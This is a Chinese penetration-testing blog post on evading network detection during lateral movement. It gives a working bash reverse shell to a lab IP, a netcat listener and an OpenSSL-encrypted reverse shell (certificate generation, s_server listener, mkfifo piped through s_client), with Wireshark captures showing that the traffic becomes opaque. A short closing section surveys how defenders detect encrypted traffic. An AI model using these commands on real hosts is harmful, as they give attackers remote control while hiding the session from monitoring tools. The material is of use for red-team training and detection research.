## 写在前面

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

## 背景描述

在攻防对抗过程中的横行渗透，经常需要反弹反向shell操作，如果反弹shel过程中流量是明文传输，那么内网环境中已有的安全检测产品（WAF/IPS/IDS/NDR/HIDS）等防护软件会进行流量检测，明文传输带有明显的攻击特征。很快会被检测发现，防守方对攻击流量回溯分析，就会阻断攻击行为。

![1653220110_628a230e9191e40d1400e.png!small?1653220109197](https://image.3001.net/images/20220522/1653220110_628a230e9191e40d1400e.png!small?1653220109197)

## 明文流量

反弹shell命令

bash -i>& /dev/tcp/10.211.55.7/12388 0>&1

![1653103410_62885b3216f87074ab87d.png!small](https://image.3001.net/images/20220521/1653103410_62885b3216f87074ab87d.png!small)

nc监听命令

nc.exe -l -p 12388

![1653103423_62885b3fc191af0e63b3b.png!small](https://image.3001.net/images/20220521/1653103423_62885b3fc191af0e63b3b.png!small)

通信过程由受害主机发起

![1653103436_62885b4cc68cc81e1a881.png!small](https://image.3001.net/images/20220521/1653103436_62885b4cc68cc81e1a881.png!small)

通过Wireshark抓包分析流量，整个通信过程全部为明文传输

过滤tcp端口

tcp.port == 12388

追踪tcp数据流

![1653103455_62885b5f0138164f23a40.png!small](https://image.3001.net/images/20220521/1653103455_62885b5f0138164f23a40.png!small)

可以明显看到操作行为

![1653103468_62885b6c804d983378001.png!small](https://image.3001.net/images/20220521/1653103468_62885b6c804d983378001.png!small)

## 加密流量

通过使用OpenSSL流量加密

1.生成OpenSSL证书，这里使用默认参数

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
-nodes

![1653103506_62885b92590b0f129d736.png!small](https://image.3001.net/images/20220521/1653103506_62885b92590b0f129d736.png!small)

2.设置监听端口（使用生成的证书）

openssl s_server -quiet -key key.pem -cert cert.pem -port 12388

![1653103521_62885ba123e9e74c46238.png!small](https://image.3001.net/images/20220521/1653103521_62885ba123e9e74c46238.png!small)

3.反弹shell命令

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect
10.211.55.7:12388 > /tmp/s; rm /tmp/s

![1653103542_62885bb63aa24955d1d9a.png!small](https://image.3001.net/images/20220521/1653103542_62885bb63aa24955d1d9a.png!small)

4.通过Wireshark抓包分析流量，整个通信过程全部为加密传输

过滤端口，发现使用tls加密

![1653103552_62885bc02b110c2b9b346.png!small](https://image.3001.net/images/20220521/1653103552_62885bc02b110c2b9b346.png!small)

![1653103560_62885bc8e9999a83ff25e.png!small](https://image.3001.net/images/20220521/1653103560_62885bc8e9999a83ff25e.png!small)

## 思考

安全的本质就是对抗！针对加密流量的检测，传统的基于特征的检测已经无法满足攻击发展的趋势，只有通过不断引入新的检测思考才能解决。

加密流量的检测，业界主流有2种方法：

第一种是将加密流量进行解密并进行检测，这需要安全检测设备充当通信双方的代理或者由客户提供单独的解密证书（只能针对该证书对应的加密流量进行解码）

第二种是在不解密的情况下进行安全检测，这通常会采用（AI）机器学习的方法。

当然对攻击行为的感知，也可以通过威胁狩猎发现。

